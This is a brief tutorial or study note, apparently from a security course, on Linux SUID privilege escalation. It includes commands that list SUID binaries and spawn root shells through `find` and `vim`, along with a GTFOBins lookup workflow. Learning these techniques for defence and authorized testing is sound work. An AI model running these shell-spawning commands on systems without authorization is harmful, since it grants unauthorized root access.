# CH-17: SUID/SGID Deep Dive (Exploitation)

## Overview
SUID exploitation is the process of finding a SUID-enabled binary owned by root and using it to spawn a shell or manipulate files with root privileges, escalating from a regular user to root.

| Command | Purpose |
|---|---|
| `find / -perm -4000 -type f 2>/dev/null` | Lists all SUID binaries on the system |
| `find . -exec /bin/sh -p \; -quit` | Spawns a root shell if `find` itself has SUID set |
| `vim -c ':!/bin/sh'` | Spawns a root shell if `vim` has SUID set |

## GTFOBins
GTFOBins (gtfobins.github.io) is a curated reference listing standard Unix binaries and the exact techniques to abuse each one when it has SUID set, is run with sudo, or has excessive permissions.

**Workflow:**
1. Run `find / -perm -4000 -type f 2>/dev/null`
2. Get your list of SUID binaries
3. Pick one that looks unusual or interesting
4. Search that binary's name on GTFOBins
5. Copy the "SUID" technique it shows
6. Run it, then verify with `whoami`

## Why It Works
Any child process spawned by a SUID binary inherits that binary's effective privileges, not the privileges of the user who launched it. This is the underlying mechanism behind every SUID exploitation technique — SUID is considered the first step of privilege escalation.

## Practical Example
```bash
find / -perm -4000 -type f 2>/dev/null
find . -exec /bin/sh -p \; -quit
whoami
```

## Summary
- SUID exploitation abuses a root-owned SUID binary to spawn a shell or manipulate files with root privileges
- A SUID binary's child processes inherit its effective privileges, not the launching user's — this is why SUID exploitation works
- GTFOBins maps a discovered SUID binary to its exact exploitation technique
- `find` and `vim` are two of the most common real-world SUID exploitation examples
